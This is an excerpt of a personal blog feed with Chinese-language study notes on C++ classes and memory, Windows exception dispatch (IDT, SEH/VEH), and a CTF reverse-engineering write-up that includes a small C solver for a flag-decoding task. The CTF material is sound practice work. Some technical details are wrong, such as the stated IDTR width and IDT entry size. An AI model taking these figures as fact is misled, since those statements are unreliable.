"</span>&lt;&lt;x&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//endl即end of line 表示结尾进行换行</span></span><br></pre></td></tr></table></figure><br>cin和count这两个运算符可以自行分析处理（强制转换）数据类型，因此无需像使用scanf和printf那样给出格式控制字符串。</p><h2 id="new和delete"><a href="#new和delete" class="headerlink" title="new和delete"></a>new和delete</h2><p>用来动态分配内存和释放内存<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *p = <span class="keyword">new</span> <span class="keyword">int</span>;  <span class="comment">//分配1个int型的内存空间</span></span><br><span class="line"><span class="keyword">delete</span> p;  <span class="comment">//释放内存</span></span><br><span class="line"><span class="comment">//以及</span></span><br><span class="line"><span class="keyword">int</span> *p = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];  <span class="comment">//分配10个int型的内存空间</span></span><br><span class="line"><span class="keyword">delete</span>[] p;</span><br></pre></td></tr></table></figure></p><h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><p>类只是一种数据类型，本身并不占用空间</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span><span class="comment">//关键字class专门用来定义类，Student是类的名称，类名首字母一般大写</span></span><br><span class="line"><span class="keyword">public</span>:<span class="comment">//表示类的成员具有公开的访问权限，其他还有private等</span></span><br><span class="line">    <span class="comment">//成员变量</span></span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">float</span> score;</span><br><span class="line">    <span class="comment">//成员函数</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;name&lt;&lt;<span class="string">"的年龄是"</span>&lt;&lt;age&lt;&lt;<span class="string">"，成绩是"</span>&lt;&lt;score&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="title">LLL</span>;</span><span class="comment">//创建对象 ，class可不要，LLL也可为数组</span></span><br><span class="line"><span class="comment">// 用.访问成员</span></span><br><span class="line"><span class="comment">//与结构体贼相似</span></span><br></pre></td></tr></table></figure><h3 id="对象指针"><a href="#对象指针" class="headerlink" title="对象指针"></a>对象指针</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在栈上分配内存</span></span><br><span class="line">Student stu;</span><br><span class="line">Student *pStu = &amp;stu;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在堆上分配内存</span></span><br><span class="line">Student *pStu = <span class="keyword">new</span> Student;</span><br><span class="line"><span class="comment">//访问时通过"-&gt;"</span></span><br></pre></td></tr></table></figure><h3 id="成员变量和成员函数"><a href="#成员变量和成员函数" class="headerlink" title="成员变量和成员函数"></a>成员变量和成员函数</h3><p>在类中直接定义函数时，不需要在函数名前加类名；当成员函数定义在类外时，要在函数名前加类名<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">float</span> score;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>;  <span class="comment">//函数声明</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Student::say</span><span class="params">()</span></span>&#123;<span class="comment">// 如果写成inline void Student::say 就为内联函数</span></span><br><span class="line">    <span class="comment">//::是域解析符（作用域运算符、作用域限定符）用来连接类名和函数名</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;name&lt;&lt;<span class="string">"的年龄是"</span>&lt;&lt;age&lt;&lt;<span class="string">"，成绩是"</span>&lt;&lt;score;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><strong>在类体中定义的成员函数会自动成为内联函数，在类体外定义的不会</strong><br>内联函数会将函数调用处用函数体代替，所以尽量在类内部作声明，在类外对函数定义   </p><blockquote><p>函数调用是有时间和空间开销的。程序在执行一个函数之前需要将实参、局部变量、返回地址以及若干寄存器都压入栈中，然后才能执行函数体中的代码；执行完之后，还要将之前压入栈中的数据都出栈，才能接着执行函数调用位置以后的代码。<br>如果函数体代码比较多，需要较长的执行时间，那么函数调用机制占用的时间可以忽略；如果函数只有一两句语句，那么大部分的时间都会花费在函数调用机制上，这种时间开销就不容忽视。<br>为了消除函数调用的时空开销，C++在编译时将函数调用处用函数体替换，即内联函数。<br>内联函数的缺点：编译后的程序会存在多份相同的函数拷贝。<br>内联函数的代码在编译后就被消除了</p></blockquote><h3 id="类成员的访问权限和类的封装"><a href="#类成员的访问权限和类的封装" class="headerlink" title="类成员的访问权限和类的封装"></a>类成员的访问权限和类的封装</h3><p>控制成员的访问权限：成员访问限定符public、protected、private<br>在类的内部，成员可以互相访问；在类的外部，只能通过对象访问public属性的成员<br>约定成员变量以<em>m_</em>开头，可以直接看出是成员变量，又可以和成员函数中的形参名字区分<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:  <span class="comment">//私有的</span></span><br><span class="line">    <span class="keyword">char</span> *m_name;</span><br><span class="line">    <span class="keyword">float</span> m_score;</span><br><span class="line"><span class="keyword">public</span>:  <span class="comment">//共有的</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setname</span><span class="params">(<span class="keyword">char</span> *name)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setscore</span><span class="params">(<span class="keyword">float</span> score)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Student::setname</span><span class="params">(<span class="keyword">char</span> *name)</span></span>&#123;</span><br><span class="line">    m_name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Student::setscore</span><span class="params">(<span class="keyword">float</span> score)</span></span>&#123;</span><br><span class="line">    m_score = score;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//在栈上创建对象</span></span><br><span class="line">    Student stu;</span><br><span class="line">    stu.setname(<span class="string">"小明"</span>);</span><br><span class="line">    stu.setscore(<span class="number">92.5f</span>);</span><br><span class="line">    <span class="comment">//在堆上创建对象</span></span><br><span class="line">    Student *pstu = <span class="keyword">new</span> Student;</span><br><span class="line">    pstu -&gt; setname(<span class="string">"李华"</span>);</span><br><span class="line">    pstu -&gt; setscore(<span class="number">96</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>下面的写法是错误的<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stu.m_name = <span class="string">"小明"</span>;</span><br><span class="line">stu.m_score = <span class="number">92.5f</span>;</span><br><span class="line">stu.show();</span><br></pre></td></tr></table></figure><br>因为私有的成员变量不能通过对象直接访问，必须借助public属性的成员函数来修改</p><h4 id="类的封装"><a href="#类的封装" class="headerlink" title="类的封装"></a>类的封装</h4><p>private：作用在于更好的隐藏内部的实现，不希望外部知道或只在内部使用的成员声明为private<br>public：向外部暴露的接口声明为public//如上面的setname()和setscore()<br>（实际项目开发中，成员变量都建议声明为private，只将允许通过对象对用的成员函数声明为public）<br>protected：在类外也不能通过对象访问，但在派生类内部可以访问</p><blockquote><p>给成员变量赋值的函数通常以set开头；读取成员变量的值的函数通常以get开头</p></blockquote><p>private 和 public的使用体现了类的封装性，即：尽量隐藏类的内部实现，只向用户提供有用的成员函数。   </p><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><p>一种特殊的成员函数，名称与类名完全相同，可用于对某些成员变量设置初始值。创建对象时系统会自动调用构造函数进行初始化工作<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Line::Line( <span class="keyword">double</span> len，<span class="keyword">int</span> age, <span class="keyword">float</span> score): length(len)<span class="comment">//构造函数，也可以对多个成员变量进行赋值</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//相当于</span></span><br><span class="line">Line::Line( <span class="keyword">double</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    length = len;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="初始化const成员变量"><a href="#初始化const成员变量" class="headerlink" title="初始化const成员变量"></a>初始化const成员变量</h4><p>如：对下面m_len的初始化<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VLA</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> m_len;</span><br><span class="line">    <span class="keyword">int</span> *m_arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    VLA(<span class="keyword">int</span> len);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>只能使用<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">VLA::VLA(<span class="keyword">int</span> len):m_len(len)&#123;</span><br><span class="line">    m_arr=<span class="keyword">new</span> <span class="keyword">int</span>[len]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//而不能：</span></span><br><span class="line">VLA::VLA(<span class="keyword">int</span> len)&#123;</span><br><span class="line">    m_len = len;</span><br><span class="line">    m_arr = <span class="keyword">new</span> <span class="keyword">int</span>[len];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="堆和栈的区别"><a href="#堆和栈的区别" class="headerlink" title="堆和栈的区别"></a>堆和栈的区别</h1><ol><li>内存分配<br>堆由程序员分配和释放；栈由编译器自动分配   </li><li>申请方式<br>堆：用malloc、new申请；栈：如int a</li><li>大小限制<br>堆：向高地址扩展，用不连续的内存空间存储。大小受到系统虚拟内存大小的限制，因此获得的空间比较大<br>栈：向低地址扩展，一块连续的内存空间。栈的大小是固定的，能申请的空间比较小</li><li>效率<br>堆：速度慢，容易产生内存碎片<br>栈：系统分配，速度快<h1 id="攻防世界逆向题"><a href="#攻防世界逆向题" class="headerlink" title="攻防世界逆向题"></a>攻防世界逆向题</h1><h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2>首先放到ida里看伪代码<br><img src="https://s1.ax1x.com/2020/05/24/tSSEUs.png" alt="tSSEUs.png"><br>其中<br>t存放的是“SharifCTF{????????????????????????????????}”<br>u存放的是“<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>*</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>”<br>s存放的是“c61b68366edeb7bdce3c6820314b7498”<br>并且s的长度和t里的?一样；“SharifCTF{”长度为10<br>整段伪代码大概就是：<br>先改变t里每个?的值，然后输出到文件，然后再改变整个t，再输出一次，最后把这个文件删了<br><img src="https://s1.ax1x.com/2020/05/24/tSSAEj.png" alt="tSSAEj.png"><br>在第一次输出时伪代码是：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(stream, <span class="string">"%s\n"</span>, u, v5);</span><br></pre></td></tr></table></figure>只有一个%s，看起来只输出了u，并没有输出v5    </li></ol><p>在第二次输出时用到了fseek(),其作用是将文件的指针移动：<br><img src="https://s1.ax1x.com/2020/05/24/tSSwrD.png" alt="tSSwrD.png">   </p><p>由于u的内容一直都是”<em>..<em>**</em>…</em>“，那么也就是说存放flag的t被最后一个循环覆盖为了一堆 *<br>综上，flag应该出现在第一次输出时的t里，得到flag的过程为程序的第一个循环，可以得到代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">50</span>]=<span class="string">"c61b68366edeb7bdce3c6820314b7498"</span>;</span><br><span class="line"><span class="keyword">int</span> v=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> v3;</span><br><span class="line"><span class="keyword">char</span> t[<span class="number">50</span>]=<span class="string">"SharifCTF&#123;????????????????????????????????&#125;"</span>; </span><br><span class="line"><span class="keyword">while</span>((<span class="keyword">signed</span> <span class="keyword">int</span> )v&lt;<span class="built_in">strlen</span>(s))&#123;</span><br><span class="line"><span class="keyword">if</span>(v&amp;<span class="number">1</span>)</span><br><span class="line">v3=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">v3=<span class="number">-1</span>;</span><br><span class="line">*(t+(<span class="keyword">signed</span> <span class="keyword">int</span>)v+<span class="number">10</span>)=s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v]+v3;</span><br><span class="line"><span class="comment">//从&#123;后面开始修改数组t的内容 </span></span><br><span class="line">v=v+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(t);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从上周开始不用写周报了&lt;br&gt;感觉没有监督就懒散了23333   &lt;/p&gt;
&lt;h1 id=&quot;壳&quot;&gt;&lt;a href=&quot;#壳&quot; class=&quot;headerlink&quot; title=&quot;壳&quot;&gt;&lt;/a&gt;壳&lt;/h1&gt;&lt;p&gt;附加在原始程序上，通过windows加载器载入内存后，先于原始程序执行，在执行过程中对原始程序进行解密、还原，还原后把控制权还给原始程序，执行原来的代码。可以防止程序文件被非法修改或者静态反编译&lt;br&gt;许多木马和病毒都喜欢用壳来保护和隐藏自己。对一些流行的壳，杀毒引擎先对目标软件进行脱壳，再进行病毒检查；对大多数私人壳，杀毒软件不会开发解压引擎，而是直接当成木马或病毒处理，因此，商业软件出于兼容性的考虑，很少使用加壳保护，而在其他方面提高软件保护强度&lt;br&gt;不同的外壳侧重方面不一样，有的侧重压缩，有的侧重加密，还有一些提供额外的功能，如注册机制、使用次数、时间限制等&lt;br&gt;
    
    </summary>
    
    
    
      <category term="加密与解密" scheme="https://brubbish.github.io/tags/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/"/>
    
      <category term="c++" scheme="https://brubbish.github.io/tags/c/"/>
    
      <category term="CTF" scheme="https://brubbish.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2020.05.11-2020.05.17</title>
    <link href="https://brubbish.github.io/32652.html"/>
    <id>https://brubbish.github.io/32652.html</id>
    <published>2020-05-17T07:00:30.000Z</published>
    <updated>2020-07-05T13:36:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows下的异常处理"><a href="#Windows下的异常处理" class="headerlink" title="Windows下的异常处理"></a>Windows下的异常处理</h1><p>操作系统处理程序错误或异常的一系列流程和技术的总称。主要有两种异常处理技术，SEH（结构化异常处理）和VEH（向量化异常处理）   </p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>中断是由外部硬件设备或异步事件产生的，异常是由内部事件产生的，可分为故障、陷阱、终止 3类。前两个是可恢复的，第三个是不可恢复的，系统必须重启   </p><h3 id="异常列表"><a href="#异常列表" class="headerlink" title="异常列表"></a>异常列表</h3><p><img src="https://s1.ax1x.com/2020/05/18/YfskvR.png" alt="YfskvR.png"><br>由cpu引发的称为硬件异常，如访问一个无效的地址；由操作系统或程序引发的称为软件异常<br>代码中可以用RaiseException()主动引发一个软件异常<br><a id="more"></a>  </p><h3 id="异常处理的基本过程"><a href="#异常处理的基本过程" class="headerlink" title="异常处理的基本过程"></a>异常处理的基本过程</h3><p>中断或异常发生时，cpu会通过中断描述符表（IDT）寻找处理函数。IDT是硬件和软件交接中断和异常的关口   </p><h4 id="IDT"><a href="#IDT" class="headerlink" title="IDT"></a>IDT</h4><p>IDT是一张位于物理内存中的线性表，共有256项，32位下每个项的长度是8字节，64位下每个项的长度是64字节。<br>IDT的位置和长度是由cpu的IDTR寄存器描述的，IDTR共有84位，高32位为基址，低16位是表度长度。可以使用SIDT和LIDT指令读写该寄存器，LIDT只能在ring0下运行<br>IDT的每一项都是一个门结构，包括：  </p><ol><li>任务门描述符，用于cpu的任务切换</li><li>中断门，用于描述中断处理程序的入口</li><li>陷阱门，用于描述异常处理程序的入口  </li></ol><p>用windbg的本地内核调试模式可以观察IDT<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lkd&gt; !idt &#x2F;a</span><br></pre></td></tr></table></figure></p><h4 id="异常处理的准备工作"><a href="#异常处理的准备工作" class="headerlink" title="异常处理的准备工作"></a>异常处理的准备工作</h4><p><img src="https://s1.ax1x.com/2020/05/18/YfsVDx.png" alt="YfsVDx.png"><br>当由异常或者中断发生时，cpu会根据中断类型号执行对应的中断处理程序。<br>各个异常处理函数除了针对本异常的特定处理之外，通常会将异常信息进行封装。<br>封装的内容中，一部分是异常记录，包含本次异常的信息，包括异常代码（异常产生的原因）、异常标志、异常发生的地址等；另一部分是陷阱帧，它精确的描述了发生异常时的线程状态，该结构与处理器有关，在不同平台上结构不同。<br>封装后，异常处理函数会调用nt!KiDispatchException函数处理异常，</p><h4 id="内核态的异常处理过程"><a href="#内核态的异常处理过程" class="headerlink" title="内核态的异常处理过程"></a>内核态的异常处理过程</h4><p>即当PreviousMode为KernelMode时。此时KiDispatchException会进行以下分发异常    </p><ol><li>检测系统是否正在被内核调试器调试。如果内核调试器存在，系统就把异常处理的控制权转交给内核调试器。内核调试器取得控制权后会根据用户对异常处理的设置来确定是否要处理异常。如果处理了，那么异常的线程就会回到原来的位置继续执行；如果无法确定是否处理，就发生中断，由用户决定处理   </li><li>如果不存在内核调试器，或者1中不处理该异常，系统将调用nt!RtlDispatchException,根据线程注册的结构化异常处理过程来处理   </li><li>如果2时没有处理异常，系统会让内核调试器再次取得对异常的处理权   </li><li>如果不存在内核调试器或3中调试器仍不处理，系统就认为不能继续运行了，会直接KeBugCheckEX,产生蓝屏错误<br>在上述异常处理过程中，只有在某一步中异常没有处理才会进行下一个过程，只要异常被处理了，就会终止整个异常处理过程</li></ol><h4 id="用户态异常处理过程"><a href="#用户态异常处理过程" class="headerlink" title="用户态异常处理过程"></a>用户态异常处理过程</h4><p>即当PreviousMode为UserMode时。此时KiDispatchException依然会检测内核调试器是否存在，如果存在就会优先把控制权交给内核调试器。多数情况下，内核调试器不处理用户态的异常，nt!KiDispatchException就会进行如下过程：</p><ol><li>如果发生异常的程序正在被调试，那么将异常信息发送给正在调试的用户态调试器；如果没有被调试就跳过这个步骤</li><li>如果没有被调试或调试器未处理异常，那么在栈上放置EXCEPTION_RECORD和CONTEXT两个结构，并将控制权返回用户态ntdll.dll中的KiUserExceptionDispatche函数，由它调用其它函数进行用户态的异常处理，这一部分涉及SEH和VEH两种处理机制。如果没有调试器能附加或调试器处理不了异常，系统就调用ExitProcess函数结束程序</li><li>如果2未能处理该异常，那么会再次回到nt!KiDispatchException,再次把异常信息发送给用户态的调试器，如果没有调试器则直接结束进程</li><li>如果3中调试器仍不处理，则nt!KiDispatchException再次把异常分发给进程的异常端口进行处理。该端口通常由子系统进程csrss.exe进行监听。子系统监听后会显示一个“应用程序错误”对话框。可以单击按钮，将其附加到调试器。如果没有调试器或者处理不了，则程序被终结</li><li>在终结程序之前，系统会再次调用发生异常的线程中的所有异常处理过程，这是线程异常处理过程中清理未释放资源的机会</li></ol><h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><p>按照<a href="http://c.biancheng.net/cplus/" target="_blank" rel="noopener">http://c.biancheng.net/cplus/</a> 的顺序</p><h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><p>在之前的周报中有记过<a href="https://brubbish.github.io/20849.html#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%88OOP%EF%BC%89%E6%B6%89%E5%8F%8A%E5%88%B0%E7%9A%84%E5%87%A0%E4%B8%AA%E5%90%8D%E8%AF%8D">2020.03.30-2020.04.05</a>，现在忘了一些，再看一看，加深印象。<br>&emsp;<br>类可以看作 c 语言中结构体的升级版。<br>类的成员不但可以是变量，还可以是函数,通过类定义出的变量叫做对象<br>（也将类的成员变量称为属性，类的成员函数称为方法）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">float</span> score;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s的年龄是 %d，成绩是 %f\n"</span>, name, age, score);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span> <span class="title">stu1</span>;</span></span><br><span class="line">stu1.name = <span class="string">"小明"</span>;</span><br><span class="line">stu1.age = <span class="number">15</span>;</span><br><span class="line">stu1.score = <span class="number">92.5f</span>;</span><br><span class="line">stu1.say();</span><br></pre></td></tr></table></figure><p>先用<strong>关键字</strong>class定义了一个<strong>类</strong>student，用这个类创建了一个<strong>对象</strong>stu1，后面这个过程叫做<strong>类的实例化</strong>，所以也称对象是类的一个<strong>实例</strong></p><p>在面向对象编程中，类由一组相关联的函数和变量组成，可以将一个或多个类放在一个源文件中，在使用时引入对应的类，调用需要的函数。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Windows下的异常处理&quot;&gt;&lt;a href=&quot;#Windows下的异常处理&quot; class=&quot;headerlink&quot; title=&quot;Windows下的异常处理&quot;&gt;&lt;/a&gt;Windows下的异常处理&lt;/h1&gt;&lt;p&gt;操作系统处理程序错误或异常的一系列流程和技术的总称。主要有两种异常处理技术，SEH（结构化异常处理）和VEH（向量化异常处理）   &lt;/p&gt;
&lt;h2 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h2&gt;&lt;p&gt;中断是由外部硬件设备或异步事件产生的，异常是由内部事件产生的，可分为故障、陷阱、终止 3类。前两个是可恢复的，第三个是不可恢复的，系统必须重启   &lt;/p&gt;
&lt;h3 id=&quot;异常列表&quot;&gt;&lt;a href=&quot;#异常列表&quot; class=&quot;headerlink&quot; title=&quot;异常列表&quot;&gt;&lt;/a&gt;异常列表&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://s1.ax1x.com/2020/05/18/YfskvR.png&quot; alt=&quot;YfskvR.png&quot;&gt;&lt;br&gt;由cpu引发的称为硬件异常，如访问一个无效的地址；由操作系统或程序引发的称为软件异常&lt;br&gt;代码中可以用RaiseException()主动引发一个软件异常&lt;br&gt;
    
    </summary>
    
    
    
      <category term="加密与解密" scheme="https://brubbish.github.io/tags/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/"/>
    
      <category term="C++" scheme="https://brubbish.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>2020.05.04-2020.05.10</title>
    <link href="https://brubbish.github.io/12483.html"/>
    <id>https://brubbish.github.io/12483.html</id>
    <published>2020-05-10T07:00:30.000Z</published>
    <updated>2020-07-05T13:29:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="攻防世界新手题"><a href="#攻防世界新手题" class="headerlink" title="攻防世界新手题"></a>攻防世界新手题</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h3><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5079&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5079&amp;page=1</a></p><p>原来flag还能长”9447{This_is_a_flag}”这样….<br><a id="more"></a></p><h3 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h3><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5078&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5078&amp;page=1</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 